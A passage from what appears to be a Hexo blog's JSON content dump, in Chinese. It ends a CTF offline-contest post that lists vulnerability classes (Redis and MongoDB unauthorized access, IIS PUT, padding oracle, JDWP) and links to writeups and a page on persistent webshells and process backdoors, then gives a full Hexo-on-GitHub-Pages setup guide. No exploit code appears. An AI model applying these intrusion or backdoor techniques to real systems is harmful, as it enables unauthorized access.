glashfish任意文件读 ms10-070 padding orcles jdwp调试漏洞 mogodb未授权 iis put解析漏洞 svn信息泄露 redis未授权 域传送 iis短文件名 ElasticSearch漏洞….. 后待续一定好多动手复现，比赛的时候才能拼手速。最后复现P牛的这个漏洞库https://github.com/phith0n/vulhub/ 线下的经验参考 http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd linux 脚本维护系统 http://weibo.com/p/1001603847172578749357?mod=zwenzhang 这里猥琐的不死马和进程后门 http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/ http://bobao.360.cn/ctf/detail/169.html https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/ 线下的一些脚本上传到了github上了大家可以找一下","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.xjseck.com/tags/WEB/"}]},{"title":"博客的搭建过程","slug":"博客的搭建过程","date":"2017-09-07T15:09:49.000Z","updated":"2018-07-16T02:22:54.501Z","comments":true,"path":"2017/09/07/博客的搭建过程/","link":"","permalink":"https://www.xjseck.com/2017/09/07/博客的搭建过程/","excerpt":"","text":"前言搭建个人博客有两种方式 第一种使用自己独立的VPS和域名这种的方式就是可扩展的方式很多种，可以直接源码安装管理数据库等，比如安装typecho、WordPress等，如果是只是为了写博文就没有必要选择这种方式了，多花费买VPS的钱了。自行安装配置这里不再累述。 第二种使用github pages +hexo+域名的方式。这种方式个人感觉比较nice。安装的过程如下前期准备 Step1先安装git nodejs 的基础上安装 hexo1#npm install hexo-cli -g 如果npm安装不了需要使用淘宝的cnpm来代替123#npm install -g cnpm --registry=https://registry.npm.taobao.org#cnpm install hexo-cli -g#hexo -v //查看一下是否安装成功 Step2然后创建一个hexo1234567891011121314151617181920#cnpm install或者#npm install #hexo init hexo //这里如果出现不能连接到git上需要使用一下代理 当前目录下创建一个hexo文件里面是hexo源文件#git config --global https.proxy http://127.0.0.1:1080#git config --global https.proxy https://127.0.0.1:1080然后进入hexo文件下运行#cd hexo#cnpm install hexo --save或者#npm install hexo --save#sudo npm install --unsafe-perm --verbose -g hexo 如果运行错误，可以执行此命令本地测试运行hexo#hexo g#hexo s出现INFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.说明就成功了 创建github pages到这里我们已经本地能运行hexo了，配置好选择好自己喜欢的主题我们创建一个github pages Step1点击Create a new repository名字一定要填写你github的名字然后创建选择主题之后访问huseck.github.io，访问自己的 Step2使用git 来管理github的仓库前期需要配置ssh-key 连接到github上 123456#ssh-keygen –t rsa –C “邮箱地址” //可以什么都不用填写 把id_rsa.pub 的内容复制到github setting 中的ssh-keys 中然后git 配置#git config –global user.name “用户名”#git config –global user.email “邮箱”然后连接测试ssh –T git@github.com Step3 创建分支管理新创建的仓库的默认分支(branches)是master 我们需要再创建一个存放hexo源文件的分支新建一个空的文件 123456#git init#git remote add origin https://github.com/Huseck/huseck.github.io.git#git pull origin master#git branch hexo //创建分支#git checkout hexo#git push origin hexo 查看一个github上仓库会发现有两个分支了需要向hexo分支上传hexo的源文件123456#git remote add origin https://github.com/github名.github.io.git#git pull origin hexo#git checkout hexo#git add . //当前有hexo源文件的目录下#git commit -m &quot;hexo blog&quot;#git push origin hexo 上传成功然后我们上传静态文件到master分支1234567891011121314151617#hexo g#hexo s //会生成public 目录里面就是我们上传到master分支上的文件 //有两种方式上传1.是#hexo d 需要配置 在hexo 源文件的根目录_config.yml最后添加deploy: type: git repo: https://github.com/Huseck/huseck.github.io.git name: Huseck email: 504038236@qq.com branch: master //第二种方式直接进入public文件下，需要执行git的拉取选择仓库等命令比较繁琐#git init#git remote add origin https://github.com/github名.github.io.git#git pull origin master#git add .#git commit -m &quot;public file&quot;#git push origin master 多电脑进行博文编写如果我们的博客不是一个人在发布博文，或者换电脑了想实现这样的思路就是创建两个分支 一个装hexo生成的静态网页 一个装hexo源文件在其他电脑上发布博客的话思路就是克隆装hexo源文件的仓库，本地编写好.md文件，然后hexo g 编译成最新的静态网页，之后hexo d 发布到装有静态网页的仓库中，就实现了最新的博文发布了，最后，最后就是把hexo源文件编写的.md博文上传到hexo源文件的仓库中，避免其他人使用的时候把之前生成的静态博文冲突掉。注：一定需要保持hexo源文件的.md文件和生成的静态文件内容保持一致具体过程 确认电脑上有git 和nodejs环境首先是已经在github上添加ssh-keys了然后本目录下新建一个空的目录1234567891011121314151617181920#git init#git remote add origin https://github.com/Huseck/huseck.github.io.git#git pull origin hexo#git checkout hexo#cnpm install 或者 npm install #cnpm install hexo --save#hexo new &quot;博文名称&quot;#hexo g#hexo s //测试是否内容更新#hexo clean //清理一下缓存#hexo g#hexo s#hexo d //上传到master中另一种方法就是 先添加远程仓库，然后克隆分支，更新内容。git clone -b hexo git@github.com:Huseck/huseck.github.io.git安装 npm install npm install hexo --save然后运行 hexo s 调试最后push 到分支 注如果出现错误需要1git config --global push.default matching 消除此警告并采用新的设置值，输入：1git config --global push.default simple 然后重新init remote 等操作需要从头开始了 更新hexo源文件 1234#hexo clean#git add .#git commit -m &quot;upodate&quot;#git push origin hexo 更新一下域名总结其他人编写博文需要在github 添加ssh-keys然后拉取hexo源文件的分支今天编写.md文件上传到hexo源文件的分支仓库中，保持博文的最新之后就是#hexo d 上传静态html 绑定域名这里使用的是阿里云的域名直接配置解析首先获取IP地址ping github名.github.io然后填写到解析地址上之后需要配置github填写自定义的域名","categories":[{"name":"blog","slug":"blog","permalink":"https://www.xjseck.com/categories/blog/"}],"tags":[{"name":"blog","slug":"blog","permalink":"https://www.xjseck.com/tags/blog/"},{"name":"运维","slug":"运维","permalink":"https://www.xjseck.com/tags/运维/"}]}]}